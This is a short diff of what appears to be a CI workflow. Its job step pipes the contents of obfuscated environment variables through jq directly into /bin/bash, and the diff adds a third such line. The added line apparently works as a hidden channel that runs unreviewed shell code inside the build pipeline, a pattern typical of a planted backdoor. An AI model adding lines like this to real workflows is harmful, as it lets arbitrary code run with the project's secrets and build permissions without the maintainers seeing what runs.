@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$ktf94251" | jq -r .c53573 | /bin/bash
           printf '%s' "$bt58" | jq -r .vk4 | /bin/bash
+          echo $gcdsd8 | jq -r .wcw61103 | /bin/bash
 
       - name: Upload results
         if: always()
